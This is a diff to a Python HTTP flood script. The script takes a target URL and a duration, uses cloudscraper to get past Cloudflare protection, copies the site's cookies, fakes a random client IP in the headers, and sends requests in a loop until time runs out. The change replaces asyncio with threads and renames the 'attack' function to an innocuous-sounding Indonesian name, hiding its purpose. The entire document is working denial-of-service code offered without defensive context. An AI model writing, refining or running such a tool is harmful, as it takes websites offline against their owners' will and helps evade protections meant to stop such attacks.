@@ -4,7 +4,7 @@ import sys
 import random
 import string
 import time
-import asyncio
+import threading
 
 url = sys.argv[1]
 time_interval = int(sys.argv[2])
@@ -16,18 +16,18 @@ if len(sys.argv) <= 2:
 def random_byte():
     return str(random.randint(0, 255))
 
-async def random_string_generate(length):
+def random_string_generate(length):
     characters = string.ascii_lowercase + string.digits
     return ''.join(random.choice(characters) for i in range(length))
 
-async def attack():
+def kirim_pengiriman():
     scraper = cloudscraper.create_scraper()
     try:
         response = scraper.get(url)
         cookie = response.cookies.get_dict()
-        user_agent = response.request.headers.get('User-Agent', 'Mozilla/5.0')
+        user_agent = response.request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3')
 
-        random_string = await random_string_generate(10)
+        random_string = random_string_generate(10)
         fake_ip = f'{random_byte()}.{random_byte()}.{random_byte()}.{random_byte()}'
 
         headers = {
@@ -41,16 +41,17 @@ async def attack():
         }
 
         requests.get(url, headers=headers)
-
     except Exception as e:
         print('Failed to get website data:', e)
 
-async def main():
+def main():
     interval = time_interval
     start_time = time.time()
 
     while time.time() - start_time <= interval:
-        await attack()
+        thread = threading.Thread(target=kirim_pengiriman)
+        thread.start()
+        thread.join()
 
 if __name__ == '__main__':
-    asyncio.run(main())
+    main()
